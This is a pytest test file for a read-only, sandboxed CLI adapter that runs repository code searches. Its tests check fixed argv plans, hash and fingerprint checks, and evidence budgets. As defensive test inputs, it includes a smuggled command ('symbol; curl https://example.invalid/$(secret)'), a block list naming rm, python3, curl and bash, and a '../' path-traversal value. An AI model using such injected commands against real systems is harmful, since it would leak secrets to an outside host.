from __future__ import annotations

import json
from pathlib import Path

import pytest
from pydantic import ValidationError

from harness.repo import (
    AllowlistedCliExecutable,
    CliOperationCommand,
    EvidenceCompleteness,
    IntelligenceBackendStatus,
    IntelligenceOperation,
    IntelligenceProvenance,
    IntelligenceReadiness,
    ReadOnlyCliBackendConfig,
    ReadOnlySemanticCliAdapter,
    RepositoryIntelligenceQuery,
    RepositoryIntelligenceResult,
    SemanticBackendDisabledError,
    SemanticCliCommandPlan,
    SemanticExecutionReceipt,
    SemanticFileDigest,
    UnsupportedSemanticOperationError,
)

_EXECUTABLE_SHA256 = "e" * 64
_CONTENT_SHA256 = "c" * 64


def _executable(identity: str = "repository-intelligence") -> AllowlistedCliExecutable:
    return AllowlistedCliExecutable(
        identity=identity,
        path=f"/opt/operator/bin/{identity}",
        sha256=_EXECUTABLE_SHA256,
    )


def _config(
    *,
    enabled: bool = True,
    max_evidence: int = 50,
    max_total_snippet_chars: int = 16_384,
) -> ReadOnlyCliBackendConfig:
    return ReadOnlyCliBackendConfig(
        backend="moderne-wrapper",
        executable=_executable(),
        commands=(
            CliOperationCommand(
                operation=IntelligenceOperation.SEARCH,
                arguments=("query", "--stdin-json"),
            ),
            CliOperationCommand(
                operation=IntelligenceOperation.REFERENCES,
                arguments=("references", "--stdin-json"),
            ),
        ),
        enabled=enabled,
        max_evidence=max_evidence,
        max_total_snippet_chars=max_total_snippet_chars,
    )


def _query(*, limit: int = 20) -> RepositoryIntelligenceQuery:
    return RepositoryIntelligenceQuery(
        operation=IntelligenceOperation.SEARCH,
        text="where authorization decisions are made",
        limit=limit,
    )


def _response(
    plan_query_sha256: str,
    *,
    fingerprint: str = "tree:abc123",
    evidence: list[dict[str, object]] | None = None,
    completeness: str = "complete",
    omitted_count: int = 0,
) -> str:
    normalized_evidence = []
    for item in evidence or []:
        normalized = dict(item)
        normalized.setdefault("content_sha256", _CONTENT_SHA256)
        normalized_evidence.append(normalized)
    return json.dumps(
        {
            "backend_version": "2026.8",
            "completeness": completeness,
            "contract_version": 1,
            "evidence": normalized_evidence,
            "omitted_count": omitted_count,
            "query_sha256": plan_query_sha256,
            "readiness": "ready",
            "repository_fingerprint": fingerprint,
        },
        sort_keys=True,
    )


def _receipt(
    plan: SemanticCliCommandPlan,
    *,
    paths: tuple[str, ...] = (),
    executable_sha256: str = _EXECUTABLE_SHA256,
    fingerprint_before: str = "tree:abc123",
    fingerprint_after: str = "tree:abc123",
    content_sha256: str = _CONTENT_SHA256,
) -> SemanticExecutionReceipt:
    return SemanticExecutionReceipt(
        plan_sha256=plan.sha256,
        executable_sha256=executable_sha256,
        repository_fingerprint_before=fingerprint_before,
        repository_fingerprint_after=fingerprint_after,
        file_digests=tuple(
            SemanticFileDigest(path=path, content_sha256=content_sha256)
            for path in paths
        ),
        filesystem_read_only=True,
        network_isolated=True,
        environment_isolated=True,
    )


def test_backend_is_disabled_by_default_and_never_probes(tmp_path: Path) -> None:
    adapter = ReadOnlySemanticCliAdapter(_config(enabled=False))
    status = adapter.status("tree:abc123")

    assert status.readiness is IntelligenceReadiness.DISABLED
    assert status.enabled is False
    assert status.current is False
    with pytest.raises(SemanticBackendDisabledError):
        adapter.plan(
            _query(),
            repository_root=tmp_path,
            repository_fingerprint="tree:abc123",
        )


def test_plan_is_deterministic_argv_only_and_keeps_query_out_of_argv(tmp_path: Path) -> None:
    adapter = ReadOnlySemanticCliAdapter(_config())
    query = RepositoryIntelligenceQuery(
        operation=IntelligenceOperation.SEARCH,
        text="symbol; curl https://example.invalid/$(secret)",
        path="src/app.py",
        limit=7,
    )

    first = adapter.plan(
        query,
        repository_root=tmp_path,
        repository_fingerprint="tree:abc123",
    )
    second = adapter.plan(
        query,
        repository_root=tmp_path,
        repository_fingerprint="tree:abc123",
    )

    assert first == second
    assert first.sha256 == second.sha256
    assert first.argv == (
        "/opt/operator/bin/repository-intelligence",
        "query",
        "--stdin-json",
    )
    assert query.text not in first.argv
    assert first.shell is False
    assert first.network_allowed is False
    assert first.inherit_environment is False
    assert first.executable.identity == "repository-intelligence"
    assert first.executable.sha256 == _EXECUTABLE_SHA256
    assert first.require_read_only_filesystem is True
    assert first.require_executable_hash_verification is True
    assert first.require_repository_fingerprint_before_and_after is True
    assert first.require_evidence_content_hash_verification is True
    assert first.environment == (("LANG", "C"), ("LC_ALL", "C"))
    assert json.loads(first.stdin_json) == {
        "contract_version": 1,
        "query": {
            "limit": 7,
            "operation": "search",
            "path": "src/app.py",
            "text": "symbol; curl https://example.invalid/$(secret)",
        },
        "repository_fingerprint": "tree:abc123",
    }


def test_parser_requires_enabled_adapter_and_operator_approved_fixed_argv(
    tmp_path: Path,
) -> None:
    query = _query()
    adapter = ReadOnlySemanticCliAdapter(_config())
    plan = adapter.plan(
        query,
        repository_root=tmp_path,
        repository_fingerprint="tree:abc123",
    )
    stdout = _response(query.sha256)

    disabled = ReadOnlySemanticCliAdapter(_config(enabled=False))
    with pytest.raises(SemanticBackendDisabledError):
        disabled.parse_result(plan, stdout, receipt=_receipt(plan))

    forged = plan.model_copy(
        update={
            "argv": (
                plan.executable.path,
                "references",
                "--stdin-json",
            )
        }
    )
    with pytest.raises(ValueError, match="operator-approved fixed argv"):
        adapter.parse_result(forged, stdout, receipt=_receipt(forged))


def test_plan_rejects_unapproved_operations_and_relative_roots(tmp_path: Path) -> None:
    adapter = ReadOnlySemanticCliAdapter(_config())
    with pytest.raises(UnsupportedSemanticOperationError):
        adapter.plan(
            RepositoryIntelligenceQuery(
                operation=IntelligenceOperation.IMPLEMENTATIONS,
                text="CommandPolicy",
            ),
            repository_root=tmp_path,
            repository_fingerprint="tree:abc123",
        )
    with pytest.raises(ValueError, match="repository_root must be absolute"):
        adapter.plan(
            _query(),
            repository_root=Path("repo"),
            repository_fingerprint="tree:abc123",
        )


@pytest.mark.parametrize(
    "arguments",
    [
        ("search", "--write"),
        ("fix",),
        ("search", "--output=result.json"),
    ],
)
def test_config_rejects_mutating_cli_arguments(arguments: tuple[str, ...]) -> None:
    with pytest.raises(ValidationError, match="mutating CLI argument"):
        ReadOnlyCliBackendConfig(
            backend="unsafe-wrapper",
            executable=_executable("unsafe"),
            commands=(
                CliOperationCommand(
                    operation=IntelligenceOperation.SEARCH,
                    arguments=arguments,
                ),
            ),
        )


def test_config_requires_absolute_executable_and_unique_operations() -> None:
    command = CliOperationCommand(
        operation=IntelligenceOperation.SEARCH,
        arguments=("search",),
    )
    with pytest.raises(ValidationError, match="absolute path"):
        ReadOnlyCliBackendConfig.model_validate(
            {
                "backend": "lsp-wrapper",
                "commands": (command,),
                "executable": {
                "identity": "lsp-wrapper",
                "path": "bin/lsp-wrapper",
                "sha256": _EXECUTABLE_SHA256,
                },
            },
        )
    with pytest.raises(ValidationError, match="only once"):
        ReadOnlyCliBackendConfig(
            backend="lsp-wrapper",
            executable=_executable("lsp-wrapper"),
            commands=(command, command),
        )


@pytest.mark.parametrize("identity", ["rm", "python3", "curl", "bash"])
def test_config_rejects_generic_or_mutating_executables(identity: str) -> None:
    with pytest.raises(ValidationError, match="dedicated operator wrapper"):
        AllowlistedCliExecutable(
            identity=identity,
            path=f"/usr/bin/{identity}",
            sha256=_EXECUTABLE_SHA256,
        )


def test_parse_result_orders_evidence_and_records_provenance(tmp_path: Path) -> None:
    adapter = ReadOnlySemanticCliAdapter(_config())
    query = _query()
    plan = adapter.plan(
        query,
        repository_root=tmp_path,
        repository_fingerprint="tree:abc123",
    )
    stdout = _response(
        query.sha256,
        evidence=[
            {
                "end_line": 18,
                "kind": "method",
                "path": "src/z.py",
                "score": 0.7,
                "snippet": "def authorize(...): ...",
                "start_line": 12,
                "symbol": "Policy.authorize",
            },
            {
                "end_line": 44,
                "kind": "class",
                "path": "src/a.py",
                "score": 0.9,
                "snippet": "class CommandPolicy: ...",
                "start_line": 20,
                "symbol": "CommandPolicy",
            },
        ],
    )

    result = adapter.parse_result(
        plan,
        stdout,
        receipt=_receipt(plan, paths=("src/a.py", "src/z.py")),
    )

    assert result.status.current is True
    assert result.completeness is EvidenceCompleteness.COMPLETE
    assert result.truncated is False
    assert [item.path for item in result.evidence] == ["src/a.py", "src/z.py"]
    assert all(item.provenance == result.provenance for item in result.evidence)
    assert result.provenance.repository_fingerprint == "tree:abc123"
    assert result.provenance.query_sha256 == query.sha256
    assert len(result.sha256) == 64


def test_parse_result_enforces_count_and_total_snippet_budgets(tmp_path: Path) -> None:
    adapter = ReadOnlySemanticCliAdapter(
        _config(max_evidence=2, max_total_snippet_chars=5)
    )
    query = _query(limit=3)
    plan = adapter.plan(
        query,
        repository_root=tmp_path,
        repository_fingerprint="tree:abc123",
    )
    evidence = [
        {
            "end_line": index,
            "kind": "function",
            "path": f"src/{index}.py",
            "score": score,
            "snippet": "abcdefgh",
            "start_line": index,
            "symbol": f"f{index}",
        }
        for index, score in [(1, 0.9), (2, 0.8), (3, 0.7)]
    ]

    stdout = _response(query.sha256, evidence=evidence)
    result = adapter.parse_result(
        plan,
        stdout,
        receipt=_receipt(plan, paths=("src/1.py", "src/2.py", "src/3.py")),
    )

    assert result.completeness is EvidenceCompleteness.PARTIAL
    assert result.truncated is True
    assert result.omitted_count == 1
    assert len(result.evidence) == 2
    assert [item.snippet for item in result.evidence] == ["abcde", ""]


def test_parse_result_requires_executor_and_file_digest_attestation(tmp_path: Path) -> None:
    adapter = ReadOnlySemanticCliAdapter(_config())
    query = _query()
    plan = adapter.plan(
        query,
        repository_root=tmp_path,
        repository_fingerprint="tree:abc123",
    )
    stdout = _response(
        query.sha256,
        evidence=[
            {
                "end_line": 1,
                "kind": "function",
                "path": "src/current.py",
                "score": 1.0,
                "start_line": 1,
            }
        ],
    )

    wrong_plan_receipt = _receipt(plan).model_copy(update={"plan_sha256": "a" * 64})
    with pytest.raises(ValueError, match="does not match the semantic command plan"):
        adapter.parse_result(plan, stdout, receipt=wrong_plan_receipt)
    with pytest.raises(ValueError, match="allowlisted digest"):
        adapter.parse_result(
            plan,
            stdout,
            receipt=_receipt(
                plan,
                paths=("src/current.py",),
                executable_sha256="f" * 64,
            ),
        )
    with pytest.raises(ValueError, match="changed before or during"):
        adapter.parse_result(
            plan,
            stdout,
            receipt=_receipt(
                plan,
                paths=("src/current.py",),
                fingerprint_after="tree:changed",
            ),
        )
    with pytest.raises(ValueError, match="not independently hashed"):
        adapter.parse_result(plan, stdout, receipt=_receipt(plan))
    with pytest.raises(ValueError, match="does not match the workspace"):
        adapter.parse_result(
            plan,
            stdout,
            receipt=_receipt(
                plan,
                paths=("src/current.py",),
                content_sha256="d" * 64,
            ),
        )


def test_stale_response_never_publishes_evidence(tmp_path: Path) -> None:
    adapter = ReadOnlySemanticCliAdapter(_config())
    query = _query()
    plan = adapter.plan(
        query,
        repository_root=tmp_path,
        repository_fingerprint="tree:new",
    )
    stdout = _response(
        query.sha256,
        fingerprint="tree:old",
        evidence=[
            {
                "end_line": 1,
                "kind": "function",
                "path": "src/stale.py",
                "score": 1.0,
                "snippet": "old()",
                "start_line": 1,
                "symbol": "old",
            }
        ],
    )

    result = adapter.parse_result(
        plan,
        stdout,
        receipt=_receipt(
            plan,
            fingerprint_before="tree:new",
            fingerprint_after="tree:new",
        ),
    )

    assert result.status.readiness is IntelligenceReadiness.STALE
    assert result.evidence == ()
    assert result.completeness is EvidenceCompleteness.UNKNOWN
    assert result.truncated is True
    assert result.omitted_count == 1


def test_parser_rejects_wrong_query_invalid_paths_and_oversize_output(tmp_path: Path) -> None:
    adapter = ReadOnlySemanticCliAdapter(_config())
    query = _query()
    plan = adapter.plan(
        query,
        repository_root=tmp_path,
        repository_fingerprint="tree:abc123",
    )
    wrong_query = _response("0" * 64)
    with pytest.raises(ValueError, match="does not match"):
        adapter.parse_result(plan, wrong_query, receipt=_receipt(plan))

    invalid_path = _response(
        query.sha256,
        evidence=[
            {
                "end_line": 1,
                "kind": "function",
                "path": "../outside.py",
                "score": 1.0,
                "start_line": 1,
            }
        ],
    )
    with pytest.raises(ValidationError, match="normalized relative paths"):
        adapter.parse_result(plan, invalid_path, receipt=_receipt(plan))

    with pytest.raises(ValueError, match="exceeds"):
        adapter.parse_result(
            plan,
            b"{" + b" " * plan.max_stdout_bytes + b"}",
            receipt=_receipt(plan),
        )


def test_contracts_are_frozen() -> None:
    query = _query()
    with pytest.raises(ValidationError, match="frozen"):
        query.limit = 99  # type: ignore[misc]


def test_result_rejects_confounded_status_and_provenance() -> None:
    query = _query()
    status = IntelligenceBackendStatus(
        backend="moderne-wrapper",
        enabled=True,
        readiness=IntelligenceReadiness.READY,
        requested_repository_fingerprint="tree:abc123",
        indexed_repository_fingerprint="tree:abc123",
    )
    base = {
        "repository_fingerprint": "tree:abc123",
        "query_sha256": query.sha256,
        "response_sha256": "a" * 64,
    }

    with pytest.raises(ValidationError, match="same backend"):
        RepositoryIntelligenceResult(
            query=query,
            status=status,
            completeness=EvidenceCompleteness.UNKNOWN,
            provenance=IntelligenceProvenance(backend="other", **base),
        )
    with pytest.raises(ValidationError, match="same index state"):
        RepositoryIntelligenceResult(
            query=query,
            status=status,
            completeness=EvidenceCompleteness.UNKNOWN,
            provenance=IntelligenceProvenance(
                backend="moderne-wrapper",
                **{**base, "repository_fingerprint": "tree:old"},
            ),
        )
